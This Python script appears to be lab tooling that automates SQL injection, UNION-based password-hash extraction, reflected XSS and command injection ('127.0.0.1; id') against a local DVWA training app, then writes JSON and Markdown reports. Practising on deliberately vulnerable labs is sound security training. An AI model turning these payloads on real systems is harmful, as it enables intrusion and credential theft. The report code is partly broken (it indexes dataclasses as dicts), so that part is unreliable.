"""
DVWA Automated Testing Script
=============================

Automated penetration testing for DVWA environment.

Usage:
    python labs/scripts/dvwa_test.py --target http://localhost:80
"""

import requests
import sys
import json
import time
import re
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict

# Output directory
OUTPUT_DIR = Path("D:/password_guesser/results")


@dataclass
class DVWATestResult:
    """DVWA test result."""
    vulnerability: str
    difficulty: str
    success: bool
    payload: str
    response_code: int
    evidence: str
    time_seconds: float


class DVWATester:
    """DVWA automated penetration testing."""

    BASE_URL = "http://localhost:80/DVWA"

    def __init__(self, target_url: str = None):
        self.target_url = target_url or self.BASE_URL
        self.session = requests.Session()
        self.session.timeout = 10
        self.results: List[DVWATestResult] = []
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    def login(self, username: str = "admin", password: str = "password") -> bool:
        """Login to DVWA."""
        login_url = f"{self.target_url}/login.php"

        try:
            # Get login page
            response = self.session.get(login_url)

            # Login
            data = {
                "username": username,
                "password": password,
                "Login": "Login"
            }
            response = self.session.post(login_url, data=data)

            if "index.php" in response.text or response.status_code == 200:
                print(f"[+] Login successful: {username}/{password}")
                return True
            else:
                print(f"[-] Login failed")
                return False

        except Exception as e:
            print(f"[-] Login error: {e}")
            return False

    def set_security_level(self, level: str = "low") -> bool:
        """Set DVWA security level."""
        levels = ["low", "medium", "high", "impossible"]

        if level not in levels:
            print(f"[-] Invalid security level: {level}")
            return False

        try:
            # Access security page
            url = f"{self.target_url}/security.php"
            response = self.session.get(url)

            # Set level
            data = {"security": level, "seclev_submit": "Submit"}
            response = self.session.post(url, data=data)

            if level in response.text:
                print(f"[+] Security level set to: {level}")
                return True
            else:
                print(f"[-] Failed to set security level")
                return False

        except Exception as e:
            print(f"[-] Error setting security: {e}")
            return False

    def test_sqli_low(self) -> DVWATestResult:
        """Test SQL Injection (Low difficulty)."""
        start_time = time.time()

        url = f"{self.target_url}/vulnerabilities/sqli/"
        payload = "1' OR '1'='1' --"

        try:
            response = self.session.get(url, params={"id": payload, "Submit": "Submit"})
            duration = time.time() - start_time

            # Check for successful injection
            success = "ID: 1' OR '1'='1'" in response.text or "First name" in response.text

            evidence = ""
            if success:
                # Extract user data
                names = re.findall(r"First name: (\w+)", response.text)
                surnames = re.findall(r"Surname: (\w+)", response.text)
                evidence = f"Extracted users: {names[:5]}"

            return DVWATestResult(
                vulnerability="SQL Injection",
                difficulty="low",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence=evidence,
                time_seconds=duration
            )

        except Exception as e:
            return DVWATestResult(
                vulnerability="SQL Injection",
                difficulty="low",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e),
                time_seconds=0
            )

    def test_sqli_medium(self) -> DVWATestResult:
        """Test SQL Injection (Medium difficulty)."""
        start_time = time.time()

        url = f"{self.target_url}/vulnerabilities/sqli/"
        payload = "1 UNION SELECT user, password FROM users--"

        try:
            # POST request for medium level
            data = {"id": payload, "Submit": "Submit"}
            response = self.session.post(url, data=data)
            duration = time.time() - start_time

            success = "admin" in response.text and "5f4dcc3b5aa765d61d8327deb882cf99" in response.text

            return DVWATestResult(
                vulnerability="SQL Injection",
                difficulty="medium",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Union injection successful" if success else "",
                time_seconds=duration
            )

        except Exception as e:
            return DVWATestResult(
                vulnerability="SQL Injection",
                difficulty="medium",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e),
                time_seconds=0
            )

    def test_xss_reflected(self) -> DVWATestResult:
        """Test Reflected XSS."""
        start_time = time.time()

        url = f"{self.target_url}/vulnerabilities/xss_r/"
        payload = "<script>alert('XSS')</script>"

        try:
            response = self.session.get(url, params={"name": payload})
            duration = time.time() - start_time

            success = payload in response.text

            return DVWATestResult(
                vulnerability="Reflected XSS",
                difficulty="low",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Script injected" if success else "",
                time_seconds=duration
            )

        except Exception as e:
            return DVWATestResult(
                vulnerability="Reflected XSS",
                difficulty="low",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e),
                time_seconds=0
            )

    def test_command_injection(self) -> DVWATestResult:
        """Test Command Injection."""
        start_time = time.time()

        url = f"{self.target_url}/vulnerabilities/exec/"
        payload = "127.0.0.1; id"

        try:
            response = self.session.post(url, data={"ip": payload, "Submit": "Submit"})
            duration = time.time() - start_time

            success = "uid=" in response.text or "gid=" in response.text

            return DVWATestResult(
                vulnerability="Command Injection",
                difficulty="low",
                success=success,
                payload=payload,
                response_code=response.status_code,
                evidence="Command executed" if success else "",
                time_seconds=duration
            )

        except Exception as e:
            return DVWATestResult(
                vulnerability="Command Injection",
                difficulty="low",
                success=False,
                payload=payload,
                response_code=0,
                evidence=str(e),
                time_seconds=0
            )

    def run_all_tests(self) -> Dict:
        """Run all DVWA tests."""
        print("\n" + "="*60)
        print("  DVWA Automated Penetration Testing")
        print("="*60)

        # Login
        if not self.login():
            print("[-] Cannot continue without login")
            return {"error": "Login failed"}

        # Test at Low security
        self.set_security_level("low")

        print("\n[*] Testing SQL Injection (Low)")
        self.results.append(self.test_sqli_low())

        print("[*] Testing SQL Injection (Medium)")
        self.set_security_level("medium")
        self.results.append(self.test_sqli_medium())

        print("[*] Testing XSS Reflected")
        self.set_security_level("low")
        self.results.append(self.test_xss_reflected())

        print("[*] Testing Command Injection")
        self.results.append(self.test_command_injection())

        # Summary
        summary = self._generate_summary()

        # Save results
        self._save_results(summary)

        return summary

    def _generate_summary(self) -> Dict:
        """Generate test summary."""
        total = len(self.results)
        success_count = sum(1 for r in self.results if r.success)
        success_rate = (success_count / total * 100) if total > 0 else 0

        return {
            "timestamp": self.timestamp,
            "target": self.target_url,
            "total_tests": total,
            "successful": success_count,
            "success_rate": round(success_rate, 1),
            "results": [asdict(r) for r in self.results]
        }

    def _save_results(self, summary: Dict):
        """Save results to JSON."""
        output_file = OUTPUT_DIR / f"dvwa_test_{self.timestamp}.json"

        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(summary, f, indent=2, ensure_ascii=False)

        print(f"\n[+] Results saved: {output_file}")

        # Markdown report
        report_file = OUTPUT_DIR / f"dvwa_report_{self.timestamp}.md"
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write("# DVWA Penetration Test Report\n\n")
            f.write(f"**Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            f.write(f"**Target**: {self.target_url}\n\n")
            f.write(f"**Success Rate**: {summary['success_rate']}%\n\n")

            f.write("## Test Results\n\n")
            f.write("| Vulnerability | Difficulty | Success | Evidence |\n")
            f.write("|--------------|------------|---------|----------|\n")

            for r in self.results:
                status = "✓" if r['success'] else "✗"
                f.write(f"| {r['vulnerability']} | {r['difficulty']} | {status} | {r['evidence']} |\n")

        print(f"[+] Report saved: {report_file}")


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="DVWA Automated Testing")
    parser.add_argument("--target", default="http://localhost:80/DVWA", help="DVWA URL")
    args = parser.parse_args()

    tester = DVWATester(args.target)
    results = tester.run_all_tests()

    print("\n" + "="*60)
    print("  Test Summary")
    print("="*60)
    print(f"Total tests: {results.get('total_tests', 0)}")
    print(f"Successful: {results.get('successful', 0)}")
    print(f"Success rate: {results.get('success_rate', 0)}%")

    for r in results.get('results', []):
        status = "[+]" if r['success'] else "[-]"
        print(f"{status} {r['vulnerability']} ({r['difficulty']}): {r['evidence']}")


if __name__ == "__main__":
    main()